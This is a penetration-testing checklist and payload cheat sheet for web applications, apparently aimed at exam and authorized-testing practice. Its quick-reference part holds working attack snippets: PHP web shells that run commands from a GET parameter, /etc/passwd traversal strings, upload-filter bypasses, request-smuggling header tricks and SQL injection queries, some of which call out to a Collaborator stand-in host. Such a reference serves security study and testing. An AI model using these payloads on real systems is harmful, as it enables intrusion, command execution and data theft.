# Identifying Attacks
Whilst its not recommended to follow a checklist, if you are really struggling, below is a list of points to help you identify attacks during a penetration test or exam.

## Access Control
1. Can the login form be bypassed? (Go straight to /admin)
2. If authenticated can you change the user ID or username?
3. Can you submit a sensitive request but change the Referer header to where the request was suppose to come from?

## Authentication
1. User enumeration 
	* Are different error messages returned for right/wrong usernames?
	* Are there different response codes for right/wrong usernames?
	* Are the response times different for right/wrong usernames?
2. Brute-force
	* Can you brute-force password/MFA?
	* Can you brute force the stay-logged-in cookie
	* Can you crack the password offline?
	* Change IP using headers to avoid IP blocking
	* Correctly authenticate every other attempt to prevent lock-outs.
3. Is basic authentication being used? base64(username:password)
4. Can you bypass MFA pages?
5. Can you reset the users password but change the user?
6. Can you poison the password reset?

## Business Logic
1. Can you change the data type on inputs? How is this handled?
2. Can you provide a really big/small/negative input? How is this handled?
3. Is an encryption oracle present (something outputting encrypted data?)

## Clickjacking
1. Are X-Frame-Options or CSP enabled?
2. Can it be used to trigger DOM XSS?
3. Is a frame busting script in use? Can this be bypassed?

## Cross-Origin Resource Sharing (CORS)
1. Can the Origin header be changed?
	* Try using `null`
	* Can you trick the header by changing the attacker url to extend the legitimate one? For example: `target.com.malicious.com`.
2. Is CORS in use?
3. Can you use CORS to access a Intranet

## Cross-Site Request Forgery (CSRF)
1. Is a CSRF token in use? Is it tied to the user session?
2. Try both POST and GET requests
3. Use burp to generate a POC

## Cross-Site Scripting (XSS)
1. Is anything present in the URL? Send this to victim
2. Blog post?
3. Attempt breaking out of input using tags, apostrophes, templates etc..
4. Utilise html attributes such as onclick and onerror.
5. Brute-force tags and attributes, what is allowed?
6. DOM Based - look for sinks and sources
7. Custom tags, canonical tags and onfocus

## Directory Traversal
1. Is a file specified in the request or a request made to fetch a file?
2. Try basic traversal (../../../../)
3. Try URL encoding and double URL encoding
4. Try absolute paths and null byte bypass

## DOM-Based Vulnerabilities
1. Identify sources and sinks
2. Use burp DOM invader
3. Websockets in use?
4. Web messages in use?

## File Upload Vulnerabilities
1. Is it possible to upload a file?
2. Can you upload PHP?
3. Change the `Content-Type` header
4. Try path traversal to upload to a different directory
5. Can you override the config file (`.htaccess`/`web.config`)?
6. Obfuscate the file extension
7. Change the magic numbers of the file
8. Try a polyglot upload

## HTTP Host Header Attacks
1. Can an arbitrary `Host` header be supplied?
2. Check for flawed validation of the header
3. Supply an absolute URL 
4. Inject multiple headers
5. Add line wrapping
6. Inject host override headers e.g. `X-Host`

## HTTP Request Smuggling
1. Are both the `Content-Length` and `Transfer-Encoding` headers in use?
2. Use the request smuggler burp plugin to try and find vulnerabilities
3. Can you obfuscate the `Transfer-Encoding` header to exploit TE.TE vulnerabilities?
4. Can you downgrade `HTTP/2` requests?
5. Can you capture other users requests?

## Information Disclosure
1. Try fuzzing for sensitive pages
	* Burp scanner
	* Dirb / DirBuster
2. Are `robots.txt` or `sitemap.xml` available?
3. Are their comments in the code?
4. Are debug pages enabled?
5. is `.git` present? Is information disclosed in past commits?
6. Are backup files present?

## Insecure Deserialization
1. Are serialized objects being used?
2. Can the object be changed directly
	* Change the values
	* Change the data types
3. Can you execute a website function?
4. Can you use magic methods?
5. Try using gadget chains
	* ysoserial
	* PHPGGC
	* Any documented gadget chains?


# Quick Reference
Quick references for payloads and syntax when testing different types of attack.

## Cross-Site Scripting

## Directory Traversal
### Filter Evasion Techniques
|Technique|Example (../../../etc/passwd)|
|---|---|
|Nested Traveral|`....//....//....//etc/passwd` (`....\/` for Windows)|
|URL Encoding|`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`|
|Double URL Encoding|`%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`|
|Start Of Path|`/var/www/images/../../../etc/passwd`|
|Null Byte Bypass|`../../../etc/passwd%00.png`|

## DOM-Based Vulnerabilities
### Common Sources
* `document.URL`
* `document.documentURI`
* `document.URLUnencoded`
* `document.baseURI`
* `location`
* `document.cookie`
* `document.referrer`
* `window.name`
* `history.pushState`
* `history.replaceState`
* `localStorage`
* `sessionStorage`
* `IndexedDB` (`mozIndexedDB`, `webkitIndexedDB`, `msIndexedDB`)
* `Database`

### Common Sinks and Vulnerabilities
|Vulnerability|Sink|
|---|---|
|[DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)|`document.write()`|
|[Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)|`window.location`|
|[Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation) |`document.cookie`|
|[JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)|`eval()`|
|[Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)|`document.domain`|
|[WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)|`WebSocket()`|
|[Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)||`element.src`|
|[Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)|`postMessage()`|
|[Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)|`setRequestHeader()`|
|[Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)|`FileReader.readAsText()`|
|[Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)|`ExecuteSql()`|
|[HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)|`sessionStorage.setItem()`|
|[Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)|`document.evaluate()`|
|[Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)|`JSON.parse()`|
|[DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)|`element.setAttribute()`|
|[Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)|`RegExp()`|

## File Upload Vulnerabilities
### Common Shells
|PHP Snippet|Functionality|
|---|---|
|`<?php echo file_get_contents('/path/to/file'); ?>`|Read a file on the filesystem.|
|`<?php echo system($_GET['c']); ?>`|Execute a system command specified by the `c` GET parameter.|

### File Extension Obfuscation
* `exploit.pHp`
* `exploit.php.jpg`
* `exploit.php.`
* `exploit%2Ephp`
* `exploit.php;.jpg` or `exploit.php%00.jpg
* `exploit.p.phphp`

### Override Config Files
`.htaccess` file which allows files with the extension `.l33t` to be executed as PHP:
```config
AddType application/x-httpd-php .l33t
```

`web.config` file which allows JSON to be served to users:
```config
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

## HTTP Headers
|Header|Description|
|---|---|
|`Accept`|Informs the server about the types of data that can be sent back.|
|`Access-Control-Allow-Credentials`|Indicates whether the response to the request can be exposed when the credentials flag is true.|
|`Access-Control-Allow-Origin`|A CORS header which specifies whether the response can be shared.|
|`Authorization`|Contains credentials to authenticate with a server.|
|`Content-Security-Policy`|Controls resources the user is allowed to load for a given page.|
|`Content-Type`|Media type of the resource.|
|`Cookie`|Contains stored HTTP cookies.|
|`Cross-Origin-Resource-Policy`|Prevents other domains from reading the response of the resources which this header is applied.|
|`Forwarded`|The domain name of the server (alternative to `Host`).|
|`Host`|The domain name of the server.|
|`Location`|Indicated the URL to redirect a page to.|
|`Origin`|Origin of the request.|
|`Pragma`|Specific header which causes effects anywhere along the request chain (caching).|
|`Referer`|The address of the previous web page from which the request was made.|
|`TE`|Specifies the transfer encodings the user is willing to accept.|
|`Transfer-Encoding`|Specifies the form of encoding to use when transferring resources.|
|`Upgrade`|Allows the server or client to upgrade or change the connection protocol.|
|`Upgrade-Insecure-Requests`|Tells the server the user's preference for an encrypted response.|
|`X-Forwarded-For`|The originating IP address.|
|`X-Forwarded-Host`|The domain name of the server (`Host` header sent to proxy).|
|`X-Forwarded-Server`|The domain name of the server (alternative to `Host`).|
|`X-Frame-Options`|Indicated whether a browser should be allowed to render a page in an `<iframe>`|
|`X-Host`|The domain name of the server (alternative to `Host`).|
|`X-HTTP-Host-Override`|Overrides the `Host` header.|

## HTTP Host Header Attacks
### Headers Which Specify The Server Host
- `Host`
- `X-Forwarded-Host`  
- `X-Host`
-   `X-Forwarded-Server`
-   `X-HTTP-Host-Override`
-   `Forwarded`

## HTTP Request Smuggling
### Obfuscating The Transfer-Encoding Header
* `Transfer-Encoding: xchunked 
* `Transfer-Encoding : chunked`
* `Transfer-Encoding: chunked`<br>`Transfer-Encoding: x`
* `Transfer-Encoding:[tab]chunked`
* `[space]Transfer-Encoding: chunked`
* `X: X[\n]Transfer-Encoding: chunked`
* `Transfer-Encoding`<br>`: chunked`

## OS Command Injection
### Command Separators
|Separator|Operating System|
|---|---|
|`&`|Unix/Windows|
|`&&`|Unix/Windows|
|<code>&#124;</code>|Unix/Windows|
|<code>&#124;&#124;</code>|Unix/Windows|
|`;`|Unix|
|`\n` or `0x0a`|Unix|
|<code>&#96;*command*&#96;</code>|Unix|
|<code>$(*command*)</code>|Unix|

### Useful Commands
|Function|Linux|Windows|
|---|---|---|
|Name of current user|`whoami`|`whoami`|
|Operating system|`uname -a`|`ver`|
|Network configuration|`ifconfig`|`ipconig /all`|
|Network connections|`netstat -an`|`netstat -an`|
|Running processes|`ps -ef`|`tasklist`|


## SQL Injection
### Database Version
|Database Type|Command|
|----|----|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

### Database Tables
|Database Type|Command|
|----|----|
|Non-Oracle|`SELECT * FROM information_schema.tables`|
|Oracle|`SELECT * FROM all_tables`|

### Database Columns
|Database Type|Command|
|----|----|
|Non-Oracle|`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`|
|Oracle|`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`|

### Time Delays
|Database Type|Command|
|----|----|
|Oracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT SLEEP(10)`|

### DNS Queries
|Database Type|Command|
|---|---|
|Oracle (Exploit)|`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
|Oracle (Admin)|`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`|
|Microsoft|`exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`|
|PostgreSQL|`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`|
|MySQL (Windows)|`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`<br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`|

## Web Cache Poisoning
`Pragma: x-get-cache-key`